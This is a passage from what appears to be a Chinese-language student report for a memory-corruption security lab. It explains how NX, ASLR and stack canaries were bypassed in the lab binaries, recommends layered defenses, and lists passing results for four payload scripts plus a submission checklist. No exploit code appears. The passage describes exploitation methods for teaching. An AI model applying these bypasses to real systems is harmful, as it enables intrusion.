| 非 PIE | 代码段地址固定，便于 ROP/ret2code | 实验的所有二进制都是非 PIE，直接提供稳定 gadget 地址 |

可见单一机制往往不足以阻止攻击：NX 被固定可执行栈绕过，ASLR 被非 PIE 代码段 + 固定栈绕过，Canary 被“在 Canary 之后写入”的 `memcpy` 绕过。真正的防线应该是多层的：从代码层面消除 `gets` 这类无边界写、限制 `memcpy` 长度、开启 PIE/ASLR/Canary/FORTIFY，并保持编译器与工具链更新。

## 11. 测试与提交

本地测试脚本严格照搬 `.github/workflows/lab3-checks.yml` 的流程（`python3 payload*.py` 生成字节流，在 `attack/` 目录用 `timeout 15s ./target < payload.bin` 运行，检查 stdout）：

| 用例 | 期望字符串 | 结果 | 连续 5 次 |
| --- | --- | --- | --- |
| `payload.py → dark-calc` | `You have successfully detonated the bomb! Congratulations!` | PASS | 5/5 |
| `payload_dark.py → dark-calc` | `Hope A will be your grade!` | PASS | 5/5 |
| `payload_rop.py → dark-calc-nx` | `Hope A will be your grade!` | PASS | 5/5 |
| `payload_canary.py → dark-log` | `Hope A will be your grade!` | PASS | 5/5 |

提交前核对：`attack/` 未做任何修改；四个 payload 脚本位于仓库根目录；实验报告（本文件导出的 PDF）位于仓库根目录；截止时间 11 月 27 日 23:59，eLearning 提交仓库链接且仓库在截止后至少 24 小时内保持 Public。
